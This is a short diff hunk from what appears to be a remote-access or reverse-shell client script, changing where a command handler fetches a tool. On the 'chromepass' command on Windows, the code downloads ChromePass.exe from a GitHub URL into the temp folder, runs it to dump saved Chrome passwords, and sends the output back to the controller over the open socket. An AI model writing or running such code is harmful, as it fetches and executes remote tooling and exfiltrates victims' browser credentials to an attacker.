@@ -41,7 +41,7 @@ while True:
                 elif d.lower() == "chromepass":
                     result = ""
                     if f"{os.name}" == "nt":
-                        urllib.request.urlretrieve("http://127.0.0.1:8000/other%20scripts/ChromePass/ChromePass.exe", f"{tempfile.gettempdir()}\ChromePass.exe")
+                        urllib.request.urlretrieve("https://github.com/sky9262/shellBit/raw/main/other%20scripts/ChromePass/ChromePass.exe", f"{tempfile.gettempdir()}\ChromePass.exe")
                         chromepass = sp.getoutput(f"{tempfile.gettempdir()}\ChromePass.exe")
                         c.send(chromepass.encode())
                         result = f"saved in \" {os.getcwd()} \""
